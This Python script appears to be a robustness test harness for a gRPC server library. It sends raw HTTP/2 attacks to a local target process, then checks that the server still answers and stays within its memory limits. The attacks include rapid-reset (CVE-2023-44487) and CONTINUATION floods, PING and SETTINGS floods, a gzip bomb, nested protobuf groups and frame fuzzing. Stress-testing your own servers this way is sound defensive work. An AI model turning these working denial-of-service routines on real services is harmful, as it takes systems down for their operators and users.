#!/usr/bin/env python3
"""A hostile client: what a peer that means harm sends to a nimgrpc server, as raw HTTP/2 frames.

    tools/hostile.py PORT PID [NAME ...]

PORT is where tools/hostiletarget listens (plaintext), PID its process. Every attack is followed
by an ordinary call (Health/Check); an attack passes when the server is alive, answers that call,
and has stayed within the memory the attack allows. Exit status 1 if one fails. With names, only
those attacks run. tools/hostile.sh builds the target and runs this against both servers.

Only the Python standard library is used. Run it against servers of your own.
"""
import gzip, os, random, resource, socket, struct, sys, time

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
DATA, HEADERS, PRIORITY, RST, SETTINGS, PUSH, PING, GOAWAY, WINUP, CONT = range(10)
CHECK, WATCH, ECHO, STREAM = ("/grpc.health.v1.Health/Check", "/grpc.health.v1.Health/Watch",
                              "/t.T/Echo", "/t.T/Stream")

def frame(t, flags, sid, payload=b""):
    return struct.pack(">I", len(payload))[1:] + bytes([t, flags]) + struct.pack(">I", sid) + payload

def hint(n, bits):
    mx = (1 << bits) - 1
    if n < mx: return bytes([n])
    out = bytearray([mx]); n -= mx
    while n >= 128: out.append((n & 127) | 128); n >>= 7
    out.append(n); return bytes(out)

def hstr(s):
    if isinstance(s, str): s = s.encode()
    return hint(len(s), 7) + s

def hpack(headers):
    """Literal header fields without indexing, no Huffman: enough to be understood."""
    return b"".join(b"\x00" + hstr(k) + hstr(v) for k, v in headers)

def grpc_headers(path, extra=()):
    return [(":method", "POST"), (":scheme", "http"), (":path", path), (":authority", "127.0.0.1"),
            ("content-type", "application/grpc"), ("te", "trailers")] + list(extra)

def msg(payload, flag=0):
    return bytes([flag]) + struct.pack(">I", len(payload)) + payload

class Conn:
    def __init__(self, port, timeout=5):
        self.s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
        self.timeout = timeout
        self.s.sendall(PREFACE + frame(SETTINGS, 0, 0))
        self.buf = b""
    def send(self, b):
        self.s.settimeout(self.timeout); self.s.sendall(b)
    def frames(self, wait=1.0):
        """What arrives within `wait`: (type, flags, stream, payload); "EOF"/"ERR" as type at the end."""
        out = []; self.s.settimeout(wait)
        try:
            while True:
                d = self.s.recv(65536)
                if not d: out.append(("EOF", 0, 0, b"")); break
                self.buf += d
                while len(self.buf) >= 9:
                    ln = int.from_bytes(self.buf[:3], "big")
                    if len(self.buf) < 9 + ln: break
                    out.append((self.buf[3], self.buf[4], int.from_bytes(self.buf[5:9], "big") & 0x7fffffff,
                                self.buf[9:9 + ln]))
                    self.buf = self.buf[9 + ln:]
        except (socket.timeout, TimeoutError): pass
        except OSError: out.append(("ERR", 0, 0, b""))
        return out
    def close(self):
        try: self.s.close()
        except OSError: pass

def probe(port, timeout=3.0):
    """An ordinary Health/Check on a connection of its own: (answered, seconds)."""
    t0 = time.time()
    try:
        c = Conn(port, timeout=timeout)
        c.send(frame(HEADERS, 4, 1, hpack(grpc_headers(CHECK))) + frame(DATA, 1, 1, msg(b"")))
        got = []; deadline = time.time() + timeout
        while time.time() < deadline:
            fr = c.frames(0.2); got += fr
            if any(f[0] == HEADERS and f[1] & 1 for f in got) or any(f[0] in ("EOF", "ERR", RST, GOAWAY) for f in fr): break
        c.close()
        ok = any(f[0] == DATA and f[2] == 1 for f in got) and any(f[0] == HEADERS and f[1] & 1 for f in got)
        return ok, round(time.time() - t0, 2)
    except OSError:
        return False, round(time.time() - t0, 2)

def rss_mb(pid):
    try:
        for line in open("/proc/%d/status" % pid):
            if line.startswith("VmRSS:"): return int(line.split()[1]) // 1024
    except OSError: pass
    return -1                      # the process is gone

def flood(c, make, count, every=1000):
    """Sends make(i) `count` times; stops when the server says GOAWAY or closes. Returns how many went."""
    n = 0
    try:
        for i in range(count):
            c.send(make(i)); n += 1
            if i % every == 0 and any(f[0] in (GOAWAY, "EOF", "ERR") for f in c.frames(0.001)): break
    except OSError: pass
    return n

# ---------------------------------------------------------------- the attacks
# Each returns a string saying what it did; a server that cannot take it shows in the probe after.

def nested_groups(port, pid):
    """Protobuf start-group tags nested 100 000 and 1 900 000 deep (200 KB, 3.8 MB), to Health/Check."""
    for n in (100_000, 1_900_000):
        body = msg(b"\xc3\x3e" * n); c = Conn(port)
        win = 65535
        for t, fl, sid, p in c.frames(0.3):
            if t == SETTINGS and not fl & 1:
                for i in range(0, len(p), 6):
                    if int.from_bytes(p[i:i + 2], "big") == 4: win = int.from_bytes(p[i + 2:i + 6], "big")
        try:
            c.send(frame(HEADERS, 4, 1, hpack(grpc_headers(CHECK))))
            sent = 0
            while sent < len(body):          # past the window the server may cut us off: that is fine
                ch = body[sent:sent + 16384]; sent += len(ch)
                c.send(frame(DATA, 1 if sent >= len(body) else 0, 1, ch))
        except OSError: pass
        c.frames(1.0); c.close()
    return "two bombs sent"

def bad_wire_type(port, pid):
    """A tag with wire type 6 (it does not exist) to Health/Check."""
    c = Conn(port); c.send(frame(HEADERS, 4, 1, hpack(grpc_headers(CHECK))) + frame(DATA, 1, 1, msg(b"\x0e\x00")))
    c.frames(1.0); c.close(); return "sent"

def rapid_reset(port, pid):
    """HEADERS and RST_STREAM in pairs (CVE-2023-44487)."""
    c = Conn(port); c.frames(0.2); hb = hpack(grpc_headers(ECHO))
    n = flood(c, lambda i: frame(HEADERS, 4, 1 + 2 * i, hb) + frame(RST, 0, 1 + 2 * i, struct.pack(">I", 8)), 200_000)
    c.close(); return "%d streams before the server cut the connection" % n

def continuation_flood(port, pid):
    """HEADERS without END_HEADERS, then CONTINUATION frames without end (CVE-2024-28182)."""
    c = Conn(port); c.frames(0.2); junk = hpack([("x-a", "b" * 100)])
    c.send(frame(HEADERS, 0, 1, hpack(grpc_headers(ECHO))))
    n = flood(c, lambda i: frame(CONT, 0, 1, junk), 100_000, every=200)
    c.close(); return "%d CONTINUATION frames" % n

def ping_flood(port, pid):
    c = Conn(port); c.frames(0.2); n = flood(c, lambda i: frame(PING, 0, 0, b"12345678"), 300_000, every=10 ** 9)
    c.close(); return "%d PINGs, their ACKs never read" % n

def settings_flood(port, pid):
    c = Conn(port); c.frames(0.2)
    n = flood(c, lambda i: frame(SETTINGS, 0, 0, struct.pack(">HI", 4, 65535)), 300_000, every=10 ** 9)
    c.close(); return "%d SETTINGS" % n

def big_header(port, pid):
    """A header value of 70 KB and of 1 MB."""
    for size in (70_000, 1_000_000):
        c = Conn(port); c.frames(0.2); hb = hpack(grpc_headers(ECHO, [("x-big", "a" * size)]))
        try:
            c.send(frame(HEADERS, 0, 1, hb[:16384])); rest = hb[16384:]
            while rest:
                c.send(frame(CONT, 4 if len(rest) <= 16384 else 0, 1, rest[:16384])); rest = rest[16384:]
        except OSError: pass
        c.frames(0.5); c.close()
    return "sent"

def huge_length_prefix(port, pid):
    """A message that says it is 4 GB long."""
    c = Conn(port); c.frames(0.2)
    c.send(frame(HEADERS, 4, 1, hpack(grpc_headers(ECHO))) + frame(DATA, 0, 1, b"\x00\xff\xff\xff\xff" + b"x" * 100))
    c.frames(1.0); c.close(); return "sent"

def gzip_bomb(port, pid):
    """1 GiB of zeros in 1 MB of gzip."""
    raw = gzip.compress(b"\x00" * (1 << 30), 9); body = msg(raw, 1)
    c = Conn(port); c.frames(0.2)
    try:
        c.send(frame(HEADERS, 4, 1, hpack(grpc_headers(ECHO, [("grpc-encoding", "gzip")]))))
        for off in range(0, len(body), 16384):
            c.send(frame(DATA, 1 if off + 16384 >= len(body) else 0, 1, body[off:off + 16384]))
            if off % 65536 == 0: c.frames(0.005)
    except OSError: pass
    c.frames(3.0); c.close(); return "%d KB sent" % (len(raw) // 1024)

def frame_fuzz(port, pid):
    """300 connections of random frames."""
    random.seed(7)
    for it in range(300):
        try:
            c = Conn(port, timeout=2); blob = b""
            for k in range(random.randint(1, 30)):
                t = random.choice([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 250])
                sid = random.choice([0, 1, 3, 2, 5, 0x7fffffff, random.getrandbits(31)])
                pl = os.urandom(random.choice([0, 1, 4, 5, 6, 8, 9, 17, 100, 16384, 16385]))
                if t == 1 and random.random() < 0.3: pl = hpack(grpc_headers(ECHO))
                blob += frame(t, random.getrandbits(8), sid, pl)
                if random.random() < 0.05: blob += os.urandom(random.randint(1, 20))
            c.send(blob); c.frames(0.01); c.close()
        except OSError: pass
    return "sent"

def hold(port, pid, path, with_message, seconds=1.5):
    """400 calls on 4 connections, opened and left; an ordinary call must get through meanwhile."""
    conns = []
    for k in range(4):
        c = Conn(port); c.frames(0.2); hb = hpack(grpc_headers(path))
        for i in range(100):
            c.send(frame(HEADERS, 4, 1 + 2 * i, hb) + (frame(DATA, 0, 1 + 2 * i, msg(b"")) if with_message else b""))
        conns.append(c)
    time.sleep(seconds)
    ok, secs = probe(port, timeout=5.0)
    for c in conns: c.close()
    time.sleep(0.5)
    if not ok: raise AssertionError("an ordinary call did not get through while 400 calls were held (%.1f s)" % secs)
    return "an ordinary call took %.2f s meanwhile" % secs

def unary_without_message(port, pid):
    """400 unary calls that never send their message."""
    return hold(port, pid, ECHO, False)

def watch_flood(port, pid):
    """400 Health/Watch calls."""
    return hold(port, pid, WATCH, True)

def streaming_left_quiet(port, pid):
    """400 streaming calls left quiet: the server's Limits.maxCallMs (3 s in the target) must end them."""
    conns = []
    for k in range(4):
        c = Conn(port); c.frames(0.2); hb = hpack(grpc_headers(STREAM))
        for i in range(100): c.send(frame(HEADERS, 4, 1 + 2 * i, hb))
        conns.append(c)
    time.sleep(4.5)                      # past maxCallMs
    ok, secs = probe(port, timeout=5.0)
    for c in conns: c.close()
    if not ok: raise AssertionError("the held streaming calls were not ended by maxCallMs")
    return "after maxCallMs an ordinary call took %.2f s" % secs

def deaf_stream(port, pid):
    """300 MB on a stream whose handler does not read (Health/Watch): the server must not keep it."""
    before = rss_mb(pid)
    c = Conn(port); c.frames(0.3)
    c.send(frame(HEADERS, 4, 1, hpack(grpc_headers(WATCH))) + frame(DATA, 0, 1, msg(b"")))
    chunk = frame(DATA, 0, 1, b"\x00" * 16384); sent = 0
    try:
        for i in range(300 * 64):
            c.send(chunk); sent += 16384
            if i % 640 == 0: c.frames(0.001)
    except OSError: pass
    time.sleep(0.5); grown = rss_mb(pid) - before; c.close()
    if grown > 64: raise AssertionError("the server grew by %d MB" % grown)
    return "%d MB accepted before the server stopped us, it grew by %d MB" % (sent >> 20, grown)

def idle_connections(port, pid):
    """500 connections that never send a byte."""
    socks = []
    try:
        for i in range(500): socks.append(socket.create_connection(("127.0.0.1", port), timeout=2))
    except OSError: pass
    time.sleep(1.0); ok, secs = probe(port)
    for s in socks: s.close()
    time.sleep(1.0)
    if not ok: raise AssertionError("an ordinary call did not get through beside %d idle connections" % len(socks))
    return "%d held, an ordinary call took %.2f s" % (len(socks), secs)

ATTACKS = [nested_groups, bad_wire_type, rapid_reset, continuation_flood, ping_flood, settings_flood,
           big_header, huge_length_prefix, gzip_bomb, frame_fuzz, unary_without_message, watch_flood,
           streaming_left_quiet, deaf_stream, idle_connections]

def main():
    if len(sys.argv) < 3: sys.exit(__doc__)
    port, pid = int(sys.argv[1]), int(sys.argv[2]); only = sys.argv[3:]
    soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (min(8192, hard) if hard != resource.RLIM_INFINITY else 8192, hard))
    ok, _ = probe(port)
    if not ok: sys.exit("the target does not answer on port %d" % port)
    failed = 0; start_rss = rss_mb(pid)
    for attack in ATTACKS:
        if only and attack.__name__ not in only: continue
        t0 = time.time()
        try: detail, verdict = attack(port, pid), "ok"
        except AssertionError as e: detail, verdict = str(e), "FAILED"
        alive = rss_mb(pid) >= 0
        answered, secs = probe(port) if alive else (False, 0)
        if not alive: verdict, detail = "FAILED", "the server died: " + detail
        elif not answered: verdict, detail = "FAILED", "the server no longer answers: " + detail
        if verdict != "ok": failed += 1
        print("%-6s %-24s %5.1f s  rss %4d MB  %s" % (verdict, attack.__name__, time.time() - t0, rss_mb(pid), detail), flush=True)
        if not alive: break
    grown = rss_mb(pid) - start_rss
    print("%d failed; the server grew by %d MB over the run" % (failed, grown))
    sys.exit(1 if failed else 0)

if __name__ == "__main__":
    main()
